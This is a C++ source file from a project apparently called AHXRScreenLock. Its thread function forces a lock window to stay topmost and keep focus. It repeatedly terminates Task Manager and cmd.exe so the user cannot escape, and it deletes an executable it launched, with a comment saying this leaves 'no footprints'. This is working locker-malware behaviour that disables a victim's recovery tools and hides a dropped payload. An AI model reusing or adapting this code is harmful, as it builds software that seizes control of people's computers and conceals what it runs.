/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include							"handle_thread.h"
#include							"read_settings.h"
#include							"server_thread.h"
#include							"processid.h"
#include							"windows.h"
#include							<tlhelp32.h>
#include							<string>

#define								CMD_KILL
#define								TASK_MANAGER_KILL
#define								FORCE_WINDOW

#define								SCREEN_LOCK_FRM				L"frmScreenLock"

#ifdef	TASK_MANAGER_KILL
	#define							SCREEN_LOCK_TSKMGR			L"taskmgr.exe"
#endif

#ifdef CMD_KILL
	#define							SCREEN_LOCK_CMD				L"cmd.exe"
#endif

using namespace						System;
using namespace						System::Threading;
using namespace						System::Diagnostics;
using namespace						System::ComponentModel;

bool								b_password_res;
bool								b_exe_attach;
PROCESS_INFORMATION					proc_info;

DWORD WINAPI calculateHandleData(LPVOID lpParameter) {

	bool
		b_found = false;
	HWND
		h_screenlock;

	while (1) {
		if (b_password_res) {
			CloseHandle(t_handle);
			break;
		}

		if (b_exe_attach) {
			DWORD dwExitCode = WaitForSingleObject( proc_info.hProcess, 10 );

			if( dwExitCode != WAIT_TIMEOUT )
				remove(ATTACH_FILE_C); // Delete the .exe after it ran. (No footprints)
		}

		if (!b_found) {
			h_screenlock = FindWindow(NULL, SCREEN_LOCK_FRM);

			if (h_screenlock != NULL)
				b_found = true;
		}
		else {
			SetWindowPos(h_screenlock, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

#ifdef FORCE_WINDOW
			// FORCE the window to be in front at all times
			SetActiveWindow(h_screenlock);
			SetFocus(h_screenlock);
			SetCapture(h_screenlock);
			SetForegroundWindow(h_screenlock);
			EnableWindow(h_screenlock, true);
#endif

#ifdef TASK_MANAGER_KILL
			DWORD d_task = FindProcessId(SCREEN_LOCK_TSKMGR);
			if (d_task != 0) {
				HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, TRUE, d_task);
				TerminateProcess(h_process, 1);
			}
#endif

#ifdef CMD_KILL
			DWORD dc_task = FindProcessId(SCREEN_LOCK_CMD);
			if (dc_task != 0) {
				HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dc_task);
				TerminateProcess(h_process, 1);
			}
#endif
		}
	}
	return 0;
}

